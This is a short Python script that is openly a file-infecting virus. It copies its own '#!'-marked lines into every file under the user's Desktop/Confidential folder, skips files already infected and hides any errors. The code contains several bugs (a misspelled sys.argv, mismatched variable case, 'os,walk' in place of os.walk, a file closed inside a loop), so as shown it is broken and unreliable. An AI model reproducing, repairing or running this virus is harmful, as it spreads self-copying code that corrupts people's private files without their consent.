import os #!
import glob #!
import sys #!
from string import * #!
def Append(filename):#!
    files=sys.agrv[0] #!
    Append=open(files,'r') #!
    victim=open(filename,'r') #!
    readvictim=Victim.read()
    if find(readvictim,"def Append(filename)")==-1: #!
        victim=open(filename,'a') #!
        for code in Append.readlines(): #!
            if("#!") in code: #!

                Append.close() #!
                mycode=(chr(10)+code) #!
                Victim.write(mycode) #!
def main(): #!
    pathname=[os.getenv('HOME')+'/Desktop/Confidential/'] #!
    try: #!
        for path in pathname: #!
            for root,dirs,files in os,walk(path): #!
                for names in files: #!
                    Append(os.path.join(root,names)) #!
    except Exception as fail: #!
        pass #!
if __name__=="__main__": #!
    main() #!
